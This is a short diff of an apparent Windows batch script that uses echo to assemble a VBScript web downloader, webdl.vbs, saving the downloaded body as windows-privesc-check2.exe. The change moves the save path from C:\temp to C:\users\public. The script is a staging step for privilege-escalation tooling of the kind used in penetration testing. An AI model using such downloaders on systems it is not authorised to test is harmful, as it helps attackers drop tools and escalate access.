@@ -18,7 +18,7 @@
  timeout 1
  echo 	.write xHttp.responseBody      >> webdl.vbs
  timeout 1
- echo 	.savetofile "C:\temp\windows-privesc-check2.exe", 2 '  >> webdl.vbs
+ echo 	.savetofile "C:\users\public\windows-privesc-check2.exe", 2 '  >> webdl.vbs
  timeout 1
  echo end with >> webdl.vbs
  timeout 1
